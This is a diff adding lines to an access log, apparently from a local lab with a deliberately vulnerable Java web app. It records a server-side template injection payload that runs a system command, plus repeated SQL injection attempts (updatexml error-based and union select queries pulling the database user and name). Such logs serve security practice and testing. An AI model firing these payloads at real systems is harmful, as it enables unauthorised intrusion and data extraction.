@@ -162,3 +162,17 @@
 127.0.0.1 - - [21/Mar/2023:18:34:00 +0800] "GET /SSTI/doc/safe/__$%7BT(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x HTTP/1.1" 200 -
 127.0.0.1 - - [21/Mar/2023:18:34:04 +0800] "GET /SSTI/doc/safe/__$%7BT(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x HTTP/1.1" 200 -
 127.0.0.1 - - [21/Mar/2023:18:34:11 +0800] "GET /SSTI/doc/vul/__$%7BT(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D__::.x HTTP/1.1" 500 298
+127.0.0.1 - - [21/Mar/2023:21:54:23 +0800] "GET /SQLI/JDBC/vul1?id=1%27--+ HTTP/1.1" 200 211
+127.0.0.1 - - [21/Mar/2023:21:57:17 +0800] "GET /SQLI/JDBC/vul1?id=1%27--+ HTTP/1.1" 200 29
+127.0.0.1 - - [21/Mar/2023:21:57:48 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20user()),0x7e),1)--%20+ HTTP/1.1" 200 61
+127.0.0.1 - - [21/Mar/2023:23:29:53 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20user()),0x7e),1)--%20+ HTTP/1.1" 200 61
+127.0.0.1 - - [21/Mar/2023:23:30:06 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat((SELECT%20user())),1)--%20+ HTTP/1.1" 200 55
+127.0.0.1 - - [21/Mar/2023:23:30:10 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat((SELECT%20user())),1)--%20+ HTTP/1.1" 200 55
+127.0.0.1 - - [21/Mar/2023:23:33:43 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20union%20select%201,1,concat(0x7e,(SELECT%20user())%20from%20users%20--%20%20 HTTP/1.1" 200 241
+127.0.0.1 - - [21/Mar/2023:23:44:10 +0800] "GET /SQLI/JDBC/vul1?id=1%E2%80%98%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)--%20+ HTTP/1.1" 200 29
+127.0.0.1 - - [21/Mar/2023:23:44:51 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20union%20select%201,2,database()--+ HTTP/1.1" 200 49
+127.0.0.1 - - [21/Mar/2023:23:44:58 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20union%20select%201,2,database()--+ HTTP/1.1" 200 49
+127.0.0.1 - - [21/Mar/2023:23:45:21 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20union%20select%201,2,user()--+ HTTP/1.1" 200 59
+127.0.0.1 - - [21/Mar/2023:23:45:54 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20user()),0x7e),1)--%20+ HTTP/1.1" 200 61
+127.0.0.1 - - [21/Mar/2023:23:45:58 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20user()),0x7e),1)--%20+ HTTP/1.1" 200 61
+127.0.0.1 - - [21/Mar/2023:23:46:10 +0800] "GET /SQLI/JDBC/vul1?id=1%27%20union%20select%201,2,user()--+ HTTP/1.1" 200 59
